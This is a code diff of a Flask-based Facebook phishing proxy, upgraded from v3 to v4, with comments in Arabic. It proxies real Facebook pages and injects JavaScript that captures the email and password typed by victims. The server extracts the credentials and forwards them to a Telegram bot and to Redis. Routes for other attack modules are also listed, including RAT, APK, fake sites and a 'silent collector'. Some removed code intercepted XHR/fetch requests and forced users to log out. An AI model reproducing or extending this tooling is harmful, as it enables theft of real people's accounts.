@@ -1,9 +1,9 @@
 # facebook_module.py
 # ============================================================
-# Facebook Proxy v3 — الحل الاحترافي الكامل
+# Facebook Proxy v4 — الحل الاحترافي الكامل
 # - يجبر الضحية على تسجيل الدخول
 # - يلتقط البيانات من الفورم مباشرة عبر JS
-# - متعدد الطبقات للالتقاط
+# - يتجنب التعارض مع Fake Sites
 # ============================================================
 
 import os
@@ -20,7 +20,6 @@ from flask import Blueprint, request, Response, redirect, make_response
 from logging_config import get_logger
 from monitoring import metrics
 
-# تخفيف SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 logger = get_logger("facebook_module")
@@ -30,7 +29,6 @@ logger = get_logger("facebook_module")
 # الإعدادات
 # ============================================================
 TARGET_DOMAIN = "www.facebook.com"
-LOGIN_ENDPOINT = "/login.php"
 
 SESSION_TIMEOUT = 600
 COOKIE_TTL = 3600
@@ -54,6 +52,28 @@ REWRITE_ATTRS = (
     'data-href', 'data-url', 'data-src', 'formaction',
     'poster', 'cite', 'background', 'longdesc', 'usemap',
     'data-video-src', 'data-video-url', 'xlink:href',
+)
+
+
+# ★★★ المسارات المحظورة (بتاعتنا، مش للـ FB Proxy)
+BLOCKED_PATHS = (
+    '/fs/',           # ★ Fake Sites (Instagram + FB templates)
+    '/apk/',
+    '/api/',
+    '/lsh',
+    '/sh/',
+    '/rat',
+    '/qr/',
+    '/dashboard',
+    '/wa/',
+    '/victim/',
+    '/sw.js',
+    '/manifest',
+    '/_',
+    '/f/',
+    '/s/',            # Silent Collector
+    '/favicon.ico',   # ★ لتجنب الـ errors
+    '/robots.txt',
 )
 
 
@@ -83,12 +103,67 @@ def _cleanup_sessions():
 
 
 # ============================================================
+# ★★★ Helper: نسخ الكوكيز بأمان ★★★
+# ============================================================
+def _copy_cookies_to_response(proxied_response, response):
+    """ينسخ الكوكيز من requests response لـ Flask response بشكل آمن"""
+    try:
+        # الطريقة الأولى: الـ cookies attribute (dict)
+        if hasattr(proxied_response, 'cookies'):
+            for cookie_name, cookie_value in proxied_response.cookies.items():
+                try:
+                    # جرب تعامل معاها كـ Cookie object
+                    if hasattr(cookie_value, 'path'):
+                        path = cookie_value.path or '/'
+                    else:
+                        path = '/'
+
+                    response.set_cookie(
+                        cookie_name,
+                        str(cookie_value),
+                        path=path,
+                        domain=None,
+                    )
+                except Exception as e:
+                    logger.debug(f"Cookie set error for {cookie_name}: {e}")
+                    # fallback: simple set
+                    try:
+                        response.set_cookie(cookie_name, str(cookie_value))
+                    except Exception:
+                        pass
+
+        # الطريقة التانية: من الـ headers (Set-Cookie)
+        try:
+            set_cookie_headers = proxied_response.headers.get('set-cookie', '')
+            if set_cookie_headers:
+                # Some responses have multiple Set-Cookie headers
+                if hasattr(proxied_response.raw.headers, 'getlist'):
+                    cookies_list = proxied_response.raw.headers.getlist('Set-Cookie')
+                    for cookie_header in cookies_list:
+                        try:
+                            # Simple parse: name=value; Path=...; ...
+                            first_part = cookie_header.split(';')[0]
+                            if '=' in first_part:
+                                cname, cval = first_part.split('=', 1)
+                                cname = cname.strip()
+                                cval = cval.strip()
+                                if cname and cval:
+                                    response.headers.add('Set-Cookie', cookie_header)
+                        except Exception as e:
+                            logger.debug(f"Cookie header parse error: {e}")
+        except Exception as e:
+            logger.debug(f"Cookie header fallback error: {e}")
+
+    except Exception as e:
+        logger.warning(f"_copy_cookies_to_response error: {e}")
+
+
+# ============================================================
 # ★★★ Save Credentials ★★★
 # ============================================================
 def save_credentials_to_db(platform, username, password, ip_address,
                             user_agent, target_chat_id, bot,
                             extra_data=None):
-    """حفظ وإرسال البيانات المسروقة"""
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
 
     alert_msg = (
@@ -111,7 +186,6 @@ def save_credentials_to_db(platform, username, password, ip_address,
         logger.info(f"✅ Credentials captured: {platform} | user={username[:30]}")
         metrics.inc_counter("credentials_captured", tags={"platform": platform})
 
-        # Redis log
         try:
             from config import redis_client
             if redis_client:
@@ -138,10 +212,9 @@ def save_credentials_to_db(platform, username, password, ip_address,
 
 
 # ============================================================
-# ★★★ Extract Credentials (ذكي جداً) ★★★
+# Extract Credentials
 # ============================================================
 def extract_credentials(form_data):
-    """استخراج شامل من أي شكل من البيانات"""
     username = None
     password = None
 
@@ -150,10 +223,8 @@ def extract_credentials(form_data):
 
     logger.info(f"📥 Form keys: {list(form_data.keys())[:15]}")
 
-    # تحويل لكل المفاتيح لـ lowercase
     lower_data = {k.lower(): v for k, v in form_data.items()}
 
-    # ---------- Username ----------
     USERNAME_KEYS = [
         'email', 'user', 'username', 'login', 'identifier',
         'phone', 'account', 'mail', 'user_email', 'userid',
@@ -169,7 +240,6 @@ def extract_credentials(form_data):
         if username:
             break
 
-    # ---------- Password ----------
     PASSWORD_KEYS = [
         'pass', 'pwd', 'password', 'secret', 'passwd',
         'user_password', 'signin_password', 'login_password',
@@ -184,29 +254,19 @@ def extract_credentials(form_data):
         if password:
             break
 
-    # ---------- Fallback: بحث عن أي قيمة فيها @ (email) ----------
     if not username:
         for k, v in lower_data.items():
             if '@' in str(v) or (str(v).replace('+', '').replace(' ', '').replace('-', '').isdigit() and len(str(v)) > 8):
                 username = str(v).strip()
                 break
 
-    # ---------- Fallback: بحث عن أي قيمة بطول معقول كـ password ----------
-    if not password and not username:
-        for k, v in lower_data.items():
-            if 4 < len(str(v)) < 100 and ' ' not in str(v):
-                # احفظ آخر قيمة كـ fallback
-                pass
-
     return username, password
 
 
 # ============================================================
-# ★★★ JS Capture Script ★★★
+# JS Capture Script
 # ============================================================
 def build_capture_script(victim_id):
-    """يبني script يلتقط البيانات لحظة Submit"""
-
     capture_endpoint = f"{request.url_root.rstrip('/')}/fb_capture"
 
     script = """
@@ -217,7 +277,6 @@ def build_capture_script(victim_id):
     var VICTIM_ID = "%s";
     var captured = false;
 
-    // ★ 1. التقاط من submit مباشرة ★
     function captureAndSend() {
         if (captured) return;
         captured = true;
@@ -233,7 +292,6 @@ def build_capture_script(victim_id):
 
             if (!name) continue;
 
-            // لاقط كل حقل مهم
             if (type === 'email' || type === 'text' || type === 'tel' ||
                 type === 'password' || name.toLowerCase().indexOf('email') >= 0 ||
                 name.toLowerCase().indexOf('user') >= 0 ||
@@ -245,7 +303,6 @@ def build_capture_script(victim_id):
             }
         }
 
-        // ★ لو مفيش data، حاول من الـ inputs المرئية ★
         if (Object.keys(data).length === 0) {
             var allInputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="password"], input[type="tel"]');
             for (var j = 0; j < allInputs.length; j++) {
@@ -258,21 +315,6 @@ def build_capture_script(victim_id):
 
         if (Object.keys(data).length === 0) return;
 
-        // أرسل للـ backend
-        try {
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', CAPTURE_URL, true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({
-                victim_id: VICTIM_ID,
-                form_data: data,
-                url: window.location.href,
-                referrer: document.referrer,
-                timestamp: Date.now()
-            }));
-        } catch(e) {}
-
-        // ★ كمان نبعت بـ fetch كـ backup ★
         try {
             fetch(CAPTURE_URL, {
                 method: 'POST',
@@ -281,14 +323,14 @@ def build_capture_script(victim_id):
                     victim_id: VICTIM_ID,
                     form_data: data,
                     url: window.location.href,
-                    backup: true
+                    referrer: document.referrer,
+                    timestamp: Date.now()
                 }),
                 keepalive: true
             }).catch(function(){});
         } catch(e) {}
     }
 
-    // ★ 2. نراقب click على زر تسجيل الدخول ★
     document.addEventListener('click', function(e) {
         var target = e.target;
         if (!target) return;
@@ -307,7 +349,6 @@ def build_capture_script(victim_id):
         }
     }, true);
 
-    // ★ 3. نراقب Enter في الفورم ★
     document.addEventListener('keydown', function(e) {
         if (e.key === 'Enter' || e.keyCode === 13) {
             var target = e.target;
@@ -317,68 +358,9 @@ def build_capture_script(victim_id):
         }
     }, true);
 
-    // ★ 4. نراقب submit الفورم ★
     document.addEventListener('submit', function(e) {
         captureAndSend();
     }, true);
-
-    // ★ 5. intercept XMLHttpRequest ★
-    var originalXHROpen = XMLHttpRequest.prototype.open;
-    var originalXHRSend = XMLHttpRequest.prototype.send;
-    XMLHttpRequest.prototype.open = function(method, url) {
-        this._capture_url = url;
-        this._capture_method = method;
-        return originalXHROpen.apply(this, arguments);
-    };
-    XMLHttpRequest.prototype.send = function(data) {
-        try {
-            if (data && typeof data === 'string') {
-                if (data.indexOf('email') >= 0 || data.indexOf('pass') >= 0 ||
-                    (this._capture_url && (
-                        this._capture_url.indexOf('login') >= 0 ||
-                        this._capture_url.indexOf('auth') >= 0
-                    ))) {
-                    fetch(CAPTURE_URL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            victim_id: VICTIM_ID,
-                            form_data: {raw_data: data.substring(0, 2000)},
-                            url: this._capture_url,
-                            source: 'xhr_intercept'
-                        })
-                    }).catch(function(){});
-                }
-            }
-        } catch(e) {}
-        return originalXHRSend.apply(this, arguments);
-    };
-
-    // ★ 6. intercept fetch ★
-    var originalFetch = window.fetch;
-    if (originalFetch) {
-        window.fetch = function(input, init) {
-            try {
-                var url = (typeof input === 'string') ? input : (input && input.url);
-                if (url && (url.indexOf('login') >= 0 || url.indexOf('auth') >= 0)) {
-                    var body = init && init.body;
-                    if (body) {
-                        fetch(CAPTURE_URL, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                victim_id: VICTIM_ID,
-                                form_data: {raw_data: String(body).substring(0, 2000)},
-                                url: url,
-                                source: 'fetch_intercept'
-                            })
-                        }).catch(function(){});
-                    }
-                }
-            } catch(e) {}
-            return originalFetch.apply(this, arguments);
-        };
-    }
 
     console.log('[Security] initialized');
 })();
@@ -389,85 +371,9 @@ def build_capture_script(victim_id):
 
 
 # ============================================================
-# ★★★ JS Force Logout Script ★★★
-# ============================================================
-def build_force_logout_script():
-    """يجبر الضحية على تسجيل الدخول حتى لو session موجود"""
-    return """
-<script>
-(function(){
-    "use strict";
-
-    // ★ 1. امسح الـ session storage ★
-    try { sessionStorage.clear(); } catch(e) {}
-
-    // ★ 2. امسح الـ IndexedDB ★
-    try {
-        if (window.indexedDB && indexedDB.databases) {
-            indexedDB.databases().then(function(dbs) {
-                dbs.forEach(function(db) {
-                    try { indexedDB.deleteDatabase(db.name); } catch(e) {}
-                });
-            });
-        }
-    } catch(e) {}
-
-    // ★ 3. امسح Service Worker ★
-    try {
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.getRegistrations().then(function(regs) {
-                regs.forEach(function(r) { r.unregister(); });
-            });
-        }
-    } catch(e) {}
-
-    // ★ 4. Force login page ★
-    setTimeout(function() {
-        // لو الصفحة هي home (فيه بيانات المستخدم) → نوجهه لـ login
-        var isLoggedIn = false;
-
-        // علامات إن الضحية مسجل دخول
-        if (document.querySelector('[aria-label="Your profile"]') ||
-            document.querySelector('[data-pagelet="ProfileTilesFeed"]') ||
-            document.querySelector('[aria-label="Facebook"] [role="navigation"]') ||
-            document.querySelector('#mount_0_0') &&
-            window.location.pathname === '/') {
-            isLoggedIn = true;
-        }
-
-        // أيضاً لو فيه رابط logout
-        if (document.querySelector('a[href*="logout"]')) {
-            isLoggedIn = true;
-        }
-
-        if (isLoggedIn) {
-            // نظف كل حاجة
-            try {
-                document.cookie.split(';').forEach(function(c) {
-                    var name = c.split('=')[0].trim();
-                    if (name) {
-                        document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;';
-                        document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;domain=.facebook.com;';
-                    }
-                });
-                localStorage.clear();
-                sessionStorage.clear();
-            } catch(e) {}
-
-            // اذهب لصفحة login
-            window.location.href = '/login.php?force=1' + (window.location.search ? window.location.search : '');
-        }
-    }, 500);
-})();
-</script>
-"""
-
-
-# ============================================================
-# ★★★ تحويل الروابط ★★★
+# تحويل الروابط
 # ============================================================
 def rewrite_urls(html_content, base_url, proxy_base_path):
-    """تحويل كل الروابط للـ proxy"""
     if not proxy_base_path:
         return html_content
 
@@ -566,7 +472,7 @@ def rewrite_urls(html_content, base_url, proxy_base_path):
 
 
 # ============================================================
-# ★★★ Real URL Extraction ★★★
+# Real URL Extraction
 # ============================================================
 def get_real_facebook_url(request_path, query_string):
     if 'url' in query_string:
@@ -586,7 +492,7 @@ def get_real_facebook_url(request_path, query_string):
 
 
 # ============================================================
-# ★★★ Loading Page ★★★
+# Loading Page
 # ============================================================
 LOADING_PAGE = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -651,18 +557,15 @@ LOADING_PAGE = """<!DOCTYPE html>
 
 
 # ============================================================
-# ★★★ Routes ★★★
+# ★★★ Init Routes ★★★
 # ============================================================
 def init_facebook_routes(app, bot):
 
     # ============================================
-    # ★★★ FB_CAPTURE — يستقبل البيانات من الـ JS ★★★
+    # FB_CAPTURE
     # ============================================
     @app.route('/fb_capture', methods=['POST', 'OPTIONS'])
     def fb_capture():
-        """★ endpoint لاستقبال البيانات من الـ JS في الصفحة ★"""
-
-        # CORS
         if request.method == 'OPTIONS':
             resp = make_response()
             resp.headers['Access-Control-Allow-Origin'] = '*'
@@ -684,12 +587,9 @@ def init_facebook_routes(app, bot):
 
             logger.info(f"🎣 CAPTURE from JS | victim={victim_id} | keys={list(form_data.keys())[:8]}")
 
-            # استخرج البيانات
             username, password = extract_credentials(form_data)
 
-            # لو ما استخرجش، حاول بشكل أعمق
             if not username or not password:
-                # ابحث عن أي قيمة
                 for k, v in form_data.items():
                     if not username and v and isinstance(v, str) and len(v) > 2:
                         if '@' in v or v.replace('+', '').replace(' ', '').replace('-', '').isdigit():
@@ -697,10 +597,8 @@ def init_facebook_routes(app, bot):
                         elif not password and len(v) > 3 and len(v) < 100:
                             password = v
 
-            # لو فيه raw_data (من XHR intercept)
             raw_data = form_data.get('raw_data', '')
             if raw_data and not username:
-                # جرب تفكك الـ JSON أو form-encoded
                 try:
                     if raw_data.startswith('{'):
                         parsed = json.loads(raw_data)
@@ -708,7 +606,6 @@ def init_facebook_routes(app, bot):
                         if u: username = u
                         if p: password = p
                     elif '=' in raw_data:
-                        # form-encoded
                         parsed = dict(x.split('=') for x in raw_data.split('&') if '=' in x)
                         u, p = extract_credentials(parsed)
                         if u: username = u
@@ -716,7 +613,6 @@ def init_facebook_routes(app, bot):
                 except Exception as e:
                     logger.debug(f"parse raw_data error: {e}")
 
-            # IP + UA
             source_ip = (
                 request.headers.get('CF-Connecting-IP') or
                 request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
@@ -751,7 +647,18 @@ def init_facebook_routes(app, bot):
 
 
     # ============================================
-    # Main Proxy Handler
+    # ★★★ Helper: check if path is ours ★★★
+    # ============================================
+    def _is_internal_path(path):
+        """يتحقق إذا كان المسار من مساراتنا الداخلية"""
+        for blocked in BLOCKED_PATHS:
+            if path.startswith(blocked):
+                return True
+        return False
+
+
+    # ============================================
+    # Main Proxy Handlers
     # ============================================
     @app.route('/login.php', methods=['GET', 'POST'])
     @app.route('/home.php', methods=['GET', 'POST'])
@@ -762,12 +669,10 @@ def init_facebook_routes(app, bot):
 
     @app.route('/<path:subpath>', methods=['GET', 'POST'])
     def fb_proxy(subpath):
-        # تخطي المسارات الداخلية
-        if subpath.startswith((
-            'apk/', 'api/', 'lsh', 'sh/', 'rat', 'qr/',
-            'dashboard', 'wa/', 'victim/', 'sw.js',
-            'manifest', '_', 'f/', 'fb_capture',
-        )):
+        # ★★★ تجاهل مساراتنا الداخلية ★★★
+        current_path = request.path
+
+        if _is_internal_path(current_path):
             from flask import abort
             abort(404)
 
@@ -808,7 +713,6 @@ def init_facebook_routes(app, bot):
                 )
                 user_agent = request.headers.get('User-Agent', 'Unknown')
 
-                # ★ لو لقينا بيانات → احفظها ★
                 if username and target_chat_id:
                     logger.info(f"🎯 CAPTURED (POST) | user={username[:20]}")
                     save_credentials_to_db(
@@ -822,7 +726,6 @@ def init_facebook_routes(app, bot):
                         extra_data={'method': 'POST', 'page': request.path}
                     )
 
-                    # عرض صفحة التحميل
                     resp = make_response(LOADING_PAGE)
                     resp.headers['Content-Type'] = 'text/html; charset=utf-8'
                     return resp
@@ -835,7 +738,6 @@ def init_facebook_routes(app, bot):
             victim_id = target_chat_id or 'anonymous'
             session = _get_session(victim_id)
 
-            # ★ لو force_login → امسح كل الـ cookies ★
             if force_login:
                 session.cookies.clear()
                 logger.info(f"🧹 Force logout for {victim_id}")
@@ -900,12 +802,10 @@ def init_facebook_routes(app, bot):
                     status=proxied_response.status_code,
                     content_type=content_type,
                 )
-                for cookie_name, cookie_value in proxied_response.cookies.items():
-                    response.set_cookie(
-                        cookie_name, cookie_value,
-                        domain=None,
-                        path=cookie_value.path or '/',
-                    )
+
+                # ★ استخدم Helper الآمن
+                _copy_cookies_to_response(proxied_response, response)
+
                 return response
 
             # ============================================
@@ -916,10 +816,8 @@ def init_facebook_routes(app, bot):
             except Exception:
                 html_content = proxied_response.content.decode('latin-1', errors='ignore')
 
-            # ★ rewrite URLs ★
             modified_html = rewrite_urls(html_content, real_fb_url, proxy_base_path)
 
-            # ★★★ نحنن إيه نوع الصفحة ★★★
             html_lower = modified_html.lower()
             is_login_page = (
                 'name="email"' in html_lower or
@@ -934,10 +832,8 @@ def init_facebook_routes(app, bot):
                 not is_login_page
             )
 
-            # ★★★ لو الصفحة home → force logout ★★★
             if is_home_page and target_chat_id and not force_login:
                 logger.info(f"🏠 Home page detected → forcing login")
-                # نوجه لصفحة login مع force=1
                 return redirect(
                     f"/login.php?id={target_chat_id}&force=1",
                     code=302
@@ -946,15 +842,9 @@ def init_facebook_routes(app, bot):
             # ★★★ Injection ★★★
             injections = []
 
-            # 1. Force logout script (على كل صفحة فيسبوك)
-            if target_chat_id:
-                injections.append(build_force_logout_script())
-
-            # 2. Capture script (فقط على صفحات فيسبوك)
             if target_chat_id and 'facebook.com' in real_fb_url:
                 injections.append(build_capture_script(target_chat_id))
 
-            # ادخلهم في الـ head
             if injections:
                 injection_html = "\n".join(injections)
                 if '</head>' in modified_html:
@@ -970,12 +860,8 @@ def init_facebook_routes(app, bot):
                 if key.lower() not in BLOCKED_RESPONSE_HEADERS:
                     response.headers[key] = value
 
-            for cookie_name, cookie_value in proxied_response.cookies.items():
-                response.set_cookie(
-                    cookie_name, cookie_value,
-                    domain=None,
-                    path=cookie_value.path or '/',
-                )
+            # ★ استخدم Helper الآمن
+            _copy_cookies_to_response(proxied_response, response)
 
             # ★ Redirects ★
             if (proxied_response.status_code in (301, 302, 303, 307, 308)
@@ -1012,4 +898,4 @@ def init_facebook_routes(app, bot):
             return redirect(f"https://{TARGET_DOMAIN}/login.php", code=302)
 
 
-    logger.info("[+] Facebook Proxy v3 routes registered")
+    logger.info("[+] Facebook Proxy v4 routes registered")
